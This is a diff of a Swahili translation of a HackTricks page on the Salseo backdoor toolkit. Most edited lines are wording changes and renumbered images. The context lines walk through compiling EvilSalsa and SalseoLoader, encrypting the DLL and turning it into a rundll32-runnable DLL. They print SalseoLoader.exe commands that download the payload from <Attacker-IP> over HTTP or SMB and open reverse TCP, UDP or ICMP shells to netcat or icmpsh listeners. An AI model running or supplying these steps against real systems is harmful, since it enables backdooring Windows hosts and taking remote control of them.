@@ -6,11 +6,11 @@
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
 * Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
@@ -20,17 +20,17 @@ Pakua msimbo wa chanzo kutoka github na kusanya **EvilSalsa** na **SalseoLoader*
 
 Kusanya miradi hiyo kwa ajili ya usanifu wa sanduku la windows ambapo utazitumia (Ikiwa Windows inasaidia x64 kusanidi kwa usanifu huo).
 
-Unaweza **kuchagua usanifu** ndani ya Visual Studio kwenye **Tab ya "Kujenga" kushoto** katika **"Lengo la Jukwaa".**
+Unaweza **kuchagua usanifu** ndani ya Visual Studio katika **Tab ya "Kujenga" kushoto** katika **"Lengo la Jukwaa".**
 
 (\*\*Ikiwa huwezi kupata chaguo hili bonyeza **"Tab ya Mradi"** kisha kwenye **"Mali ya <Jina la Mradi>"**)
 
-![](<../.gitbook/assets/image (836).png>)
+![](<../.gitbook/assets/image (839).png>)
 
-Kisha, jenga miradi yote miwili (Kujenga -> Kujenga Suluhisho) (Ndani ya magogo kutatokea njia ya faili ya kutekelezeka):
+Kisha, jenga miradi yote (Kujenga -> Kujenga Suluhisho) (Ndani ya magogo kutatokea njia ya faili ya kutekelezeka):
 
-![](<../.gitbook/assets/image (378).png>)
+![](<../.gitbook/assets/image (381).png>)
 
-## Tengeneza mlango wa nyuma
+## Andaa mlango wa nyuma
 
 Kwanza kabisa, utahitaji kuweka msimbo wa **EvilSalsa.dll.** Kufanya hivyo, unaweza kutumia skripti ya python **encrypterassembly.py** au unaweza kusanya mradi **EncrypterAssembly**:
 
@@ -52,19 +52,19 @@ Sasa una kila kitu unachohitaji kutekeleza kila kitu cha Salseo: **EvilDalsa.dll
 
 ### **Kupata ganda la nyuma la TCP (kupakua dll iliyohifadhiwa kupitia HTTP)**
 
-Kumbuka kuanzisha nc kama msikilizaji wa ganda la nyuma la nyuma na seva ya HTTP kutumikia evilsalsa iliyohifadhiwa.
+Kumbuka kuanza nc kama msikilizaji wa ganda la nyuma na seva ya HTTP kutumikia evilsalsa iliyohifadhiwa.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **Kupata kifuniko cha nyuma cha UDP (kupakua dll iliyohifadhiwa kupitia SMB)**
+### **Kupata ganda la kurudisha UDP (kupakua dll iliyohifadhiwa kupitia SMB)**
 
-Kumbuka kuanza nc kama msikilizaji wa kifuniko cha nyuma, na seva ya SMB kuhudumia evilsalsa iliyohifadhiwa (impacket-smbserver).
+Kumbuka kuanza nc kama msikilizaji wa ganda la kurudisha, na seva ya SMB kutumikia evilsalsa iliyohifadhiwa (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **Kupata kifaa cha kurudi shell ya ICMP (dll iliyosimbwa tayari ndani ya mwathiriwa)**
+### **Kupata ganda la nyuma la ICMP (dll iliyosimbwa tayari ndani ya mwathiriwa)**
 
-**Wakati huu unahitaji zana maalum kwenye mteja kupokea shell ya kurudi. Pakua:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**Wakati huu unahitaji chombo maalum kwenye mteja kupokea ganda la nyuma. Pakua:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **Zima Majibu ya ICMP:**
 ```
@@ -87,25 +87,25 @@ Fungua mradi wa SalseoLoader ukitumia Visual Studio.
 
 ### Ongeza kabla ya kazi kuu: \[DllExport]
 
-![](<../.gitbook/assets/image (405).png>)
+![](<../.gitbook/assets/image (409).png>)
 
 ### Sakinisha DllExport kwa mradi huu
 
 #### **Zana** --> **Msimamizi wa Pakiti ya NuGet** --> **Dhibiti Pakiti za NuGet kwa Suluhisho...**
 
-![](<../.gitbook/assets/image (878).png>)
+![](<../.gitbook/assets/image (881).png>)
 
-#### **Tafuta pakiti ya DllExport (kwa kutumia kichupo cha Kutafuta), kisha bonyeza Sakinisha (na ukubali kidirisha cha arifa)**
+#### **Tafuta pakiti ya DllExport (utumie kichupo cha Kutafuta), kisha bonyeza Sakinisha (na ukubali kisandukuche)**
 
-![](<../.gitbook/assets/image (97).png>)
+![](<../.gitbook/assets/image (100).png>)
 
 Katika folda yako ya mradi, faili zimeonekana: **DllExport.bat** na **DllExport\_Configure.bat**
 
-### **O**ndoa DllExport
+### **Ondoa** DllExport
 
 Bonyeza **Ondoa** (ndio, ni ajabu lakini niamini, ni muhimu)
 
-![](<../.gitbook/assets/image (94).png>)
+![](<../.gitbook/assets/image (97).png>)
 
 ### **Toka** Visual Studio na tekeleza DllExport\_configure
 
@@ -113,27 +113,27 @@ Tu **toka** Visual Studio
 
 Kisha, nenda kwenye **folda yako ya SalseoLoader** na **tekeleza DllExport\_Configure.bat**
 
-Chagua **x64** (ikiwa utaitumia ndani ya sanduku la x64, hilo lilikuwa kesi yangu), chagua **System.Runtime.InteropServices** (ndani ya **Namespace for DllExport**) na bonyeza **Tumia**
+Chagua **x64** (ikiwa utaitumia ndani ya sanduku la x64, hilo lilikuwa kesi yangu), chagua **System.Runtime.InteropServices** (ndani ya **Jina nafasi kwa DllExport**) na bonyeza **Tumia**
 
-![](<../.gitbook/assets/image (879).png>)
+![](<../.gitbook/assets/image (882).png>)
 
-### **Fungua tena mradi na Visual Studio**
+### **Fungua** mradi tena kwa kutumia Visual Studio
 
 **\[DllExport]** haipaswi tena kuwa na alama ya kosa
 
-![](<../.gitbook/assets/image (667).png>)
+![](<../.gitbook/assets/image (670).png>)
 
 ### Jenga suluhisho
 
 Chagua **Aina ya Matokeo = Maktaba ya Darasa** (Mradi --> Mali za SalseoLoader --> Maombi --> Aina ya Matokeo = Maktaba ya Darasa)
 
-![](<../.gitbook/assets/image (844).png>)
+![](<../.gitbook/assets/image (847).png>)
 
 Chagua **jukwaa la x64** (Mradi --> Mali za SalseoLoader --> Jenga --> Lengo la Jukwaa = x64)
 
-![](<../.gitbook/assets/image (282).png>)
+![](<../.gitbook/assets/image (285).png>)
 
-Kujenga suluhisho: Jenga --> Jenga Suluhisho (Ndani ya konsoli ya Matokeo, njia ya DLL mpya itaonekana)
+Kwa **kujenga** suluhisho: Jenga --> Jenga Suluhisho (Ndani ya konsoli ya Matokeo, njia ya DLL mpya itaonekana)
 
 ### Jaribu Dll iliyozalishwa
 
@@ -145,7 +145,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 Ikiwa hakuna kosa linaonekana, huenda una DLL inayofanya kazi!!
 
-## Pata kifaa cha kuingia kutumia DLL
+## Pata ganda kwa kutumia DLL
 
 Usisahau kutumia **seva** ya **HTTP** na weka msikilizaji wa **nc**
 
@@ -175,10 +175,10 @@ rundll32.exe SalseoLoader.dll,main
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
